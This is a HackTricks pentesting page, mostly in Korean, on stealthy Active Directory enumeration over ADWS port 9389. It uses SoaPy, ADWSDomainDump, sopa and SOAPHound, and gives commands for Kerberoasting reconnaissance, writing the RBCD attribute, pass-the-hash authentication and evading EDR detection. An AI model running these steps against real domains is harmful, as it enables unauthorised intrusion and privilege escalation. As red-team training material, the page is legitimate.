# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화**되어 있으며 TCP **9389**에서 수신 대기합니다. 이름과 달리 **HTTP는 사용되지 않습니다**. 대신 독점적인 .NET framing protocol 스택을 통해 LDAP 스타일의 데이터를 노출합니다:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

트래픽은 이러한 binary SOAP frame 내부에 캡슐화되고 일반적이지 않은 포트를 통해 전송되므로, **ADWS를 통한 enumeration은 기존 LDAP/389 및 636 트래픽보다 검사, 필터링 또는 signature 적용 대상이 될 가능성이 훨씬 낮습니다**. operator에게 이는 다음을 의미합니다:<sup>[[1]](#references)[[7]](#references)</sup>

* 더 은밀한 recon – Blue team은 LDAP query에 집중하는 경우가 많습니다.
* SOCKS proxy를 통해 9389/TCP를 tunnelling하여 **non-Windows host(Linux, macOS)**에서 수집할 수 있는 자유.
* LDAP를 통해 얻을 수 있는 것과 동일한 데이터(users, groups, ACLs, schema 등)와 **write**를 수행할 수 있는 기능(예: **RBCD**를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS interaction은 WS-Enumeration을 통해 구현됩니다. 모든 query는 LDAP filter/attributes를 정의하는 `Enumerate` message로 시작하며, `EnumerationContext` GUID를 반환합니다. 이후 하나 이상의 `Pull` message가 server에서 정의한 result window까지 결과를 stream합니다.<sup>[[7]](#references)</sup> Context는 약 30분 후 만료되므로, state 손실을 방지하려면 tooling에서 결과를 page 처리하거나 filter를 분할해야 합니다(CN별 prefix query).<sup>[[8]](#references)</sup> Security descriptor를 요청할 때는 SACL을 제외하도록 `LDAP_SERVER_SD_FLAGS_OID` control을 지정해야 합니다. 그렇지 않으면 ADWS는 SOAP response에서 `nTSecurityDescriptor` attribute를 단순히 제거합니다.

> NOTE: ADWS는 여러 RSAT GUI/PowerShell tool에서도 사용되므로 트래픽이 정상적인 admin activity와 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy)는 **pure Python으로 ADWS protocol stack을 완전히 재구현한 것**입니다. NBFX/NBFSE/NNS/NMF frame을 byte 단위로 생성하므로 .NET runtime을 사용하지 않고도 Unix 계열 시스템에서 수집할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Key Features

* **SOCKS를 통한 proxying**을 지원합니다(C2 implant에서 유용).
* LDAP `-q '(objectClass=user)'`와 동일한 세밀한 search filter.
* 선택적 **write** operation(`--set` / `--delete`).
* BloodHound에 직접 ingest할 수 있는 **BOFHound output mode**.<sup>[[3]](#references)</sup>
* 사람이 읽기 쉬운 형식이 필요할 때 timestamp / `userAccountControl`을 보기 좋게 표시하는 `--parse` flag.<sup>[[2]](#references)</sup>

### Targeted collection flags & write operations

SoaPy에는 ADWS를 통해 가장 일반적인 LDAP hunting task를 재현하는 엄선된 switch가 포함되어 있습니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`와 custom pull을 위한 raw `--query` / `--filter` option입니다. 여기에 `--rbcd <source>`(`msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(targeted Kerberoasting을 위한 SPN staging), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH` 전환)과 같은 write primitive를 함께 사용할 수 있습니다.<sup>[[2]](#references)</sup>

`samAccountName`과 `servicePrincipalName`만 반환하는 targeted SPN hunt 예제:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
동일한 host/credentials를 사용해 findings를 즉시 weaponise하세요. `--rbcds`로 RBCD-capable objects를 dump한 다음, `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation chain을 준비합니다. 전체 abuse path는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)을 참조하세요.

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* LDAP 쿼리를 TCP/9389의 ADWS 호출로 대체하여 LDAP-signature 탐지를 줄인 `ldapdomaindump`의 Fork입니다.
* `--force`가 전달되지 않으면 9389에 대한 초기 도달 가능성 확인을 수행합니다(포트 스캔이 noisy/filtered인 경우 probe를 건너뜁니다).
* Microsoft Defender for Endpoint 및 CrowdStrike Falcon을 대상으로 테스트했으며, README에 성공적인 bypass가 설명되어 있습니다.<sup>[[4]](#references)</sup>

### 설치
```bash
pipx install .
```
### 사용법
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
일반적인 출력에는 9389 reachability check, ADWS bind, 그리고 dump start/finish가 기록됩니다:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang용 실용적인 ADWS client

soapy와 마찬가지로 [sopa](https://github.com/Macmod/sopa)는 Golang으로 ADWS protocol stack (MS-NNS + MC-NMF + SOAP)을 구현하며, 다음과 같은 ADWS 호출을 수행할 수 있는 command-line flags를 제공합니다:<sup>[[5]](#references)</sup>

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` 및 `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* 그 외에도 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 등이 있습니다.

### Protocol mapping highlights

* LDAP-style searches는 attribute projection, scope control (Base/OneLevel/Subtree), pagination을 지원하는 **WS-Enumeration** (`Enumerate` + `Pull`)을 통해 수행됩니다.
* 단일 object 조회에는 **WS-Transfer** `Get`이 사용되며, attribute 변경에는 `Put`, 삭제에는 `Delete`가 사용됩니다.
* Built-in object 생성에는 **WS-Transfer ResourceFactory**가 사용되고, custom object에는 YAML templates로 구동되는 **IMDA AddRequest**가 사용됩니다.
* Password 작업은 **MS-ADCAP** actions (`SetPassword`, `ChangePassword`)입니다.<sup>[[5]](#references)</sup>

### Unauthenticated metadata discovery (mex)

ADWS는 credentials 없이 WS-MetadataExchange를 노출하므로, authentication 전에 exposure를 빠르게 검증할 수 있습니다:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### DNS/DC discovery 및 Kerberos targeting notes

`--dc`가 생략되고 `--domain`이 제공되면 Sopa는 SRV를 통해 DC를 resolve할 수 있습니다. 다음 순서로 쿼리하고 우선순위가 가장 높은 target을 사용합니다:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
운영 측면에서는 segmented environments에서 발생하는 failures를 방지하기 위해 DC-controlled resolver를 우선 사용하세요:

* `--dns <DC-IP>`를 사용하면 **모든** SRV/PTR/forward lookup이 DC DNS를 통해 수행됩니다.
* UDP가 차단되어 있거나 SRV 응답이 큰 경우 `--dns-tcp`를 사용하세요.
* Kerberos가 활성화되어 있고 `--dc`가 IP인 경우, sopa는 올바른 SPN/KDC targeting을 위해 FQDN을 얻으려고 **reverse PTR**을 수행합니다. Kerberos를 사용하지 않으면 PTR lookup은 발생하지 않습니다.

Example (IP + Kerberos, DC를 통한 강제 DNS):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Auth material options

평문 password 외에도 sopa는 ADWS auth에 **NT hashes**, **Kerberos AES keys**, **ccache**, **PKINIT certificates**(PFX 또는 PEM)를 지원합니다. `--aes-key`, `-c`(ccache) 또는 certificate-based options를 사용하면 Kerberos가 자동으로 적용됩니다.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### 템플릿을 통한 커스텀 object 생성

임의의 object class의 경우 `create custom` command는 IMDA `AddRequest`에 매핑되는 YAML template을 사용합니다:<sup>[[5]](#references)</sup>

* `parentDN`과 `rdn`은 container와 relative DN을 정의합니다.
* `attributes[].name`은 `cn` 또는 namespaced `addata:cn`을 지원합니다.
* `attributes[].type`은 `string|int|bool|base64|hex` 또는 명시적인 `xsd:*`를 허용합니다.
* `ad:relativeDistinguishedName` 또는 `ad:container-hierarchy-parent`를 포함하지 마세요. sopa가 이를 주입합니다.
* `hex` 값은 `xsd:base64Binary`로 변환됩니다. 빈 string을 설정하려면 `value: ""`을 사용합니다.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)는 모든 LDAP interaction을 ADWS 내부에서 유지하고 BloodHound v4-compatible JSON을 생성하는 .NET collector입니다. 한 번 `objectSid`, `objectGUID`, `distinguishedName`, `objectClass`의 complete cache를 구축한 후(`--buildcache`), 이를 재사용하여 high-volume `--bhdump`, `--certdump` (ADCS) 또는 `--dnsdump` (AD-integrated DNS) pass를 수행하므로 약 35개의 critical attribute만 DC 외부로 전송됩니다. AutoSplit(`--autosplit --threshold <N>`)은 대규모 forest에서 30분 EnumerationContext timeout 이내에 유지되도록 CN prefix 기준으로 query를 자동으로 shard합니다.<sup>[[8]](#references)</sup>

domain-joined operator VM에서의 일반적인 workflow:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON 슬롯을 SharpHound/BloodHound workflow에 직접 넣을 수 있습니다. 이후 그래프화 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 쿼리 수를 ADExplorer 스타일 snapshot보다 적게 유지하면서도 수백만 개 객체로 구성된 forest에서 SOAPHound의 안정성을 높여 줍니다.

## Stealth AD Collection Workflow

다음 workflow는 Linux에서 ADWS를 통해 **domain 및 ADCS objects**를 열거하고, 이를 BloodHound JSON으로 변환한 뒤, certificate 기반 attack path를 탐색하는 방법을 보여 줍니다.

1. 대상 네트워크에서 사용자 시스템으로 **9389/TCP를 tunnel**합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등). `export HTTPS_PROXY=socks5://127.0.0.1:1080`을 실행하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용합니다.

2. **root domain object를 수집합니다:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC에서 ADCS 관련 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP을 업로드**하고 BloodHound GUI에서 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`와 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) 쓰기
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## 도구 요약

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| 대규모 ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch logs 변환 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 동일한 SOCKS를 통해 proxy 가능 |
| ADWS enumeration 및 object changes | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS endpoints와 interface하기 위한 generic client - enumeration, object creation, attribute modifications, password changes 지원 |

## References

- [1] [SpecterOps – SOAP(y)를 사용해야 하는 이유 – ADWS를 사용한 stealthy AD collection을 위한 operator 가이드](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – ADWS를 통한 Active Directory 환경의 stealthy Enumeration](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ADWS를 통해 Active Directory 데이터를 수집하는 SOAPHound tool](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
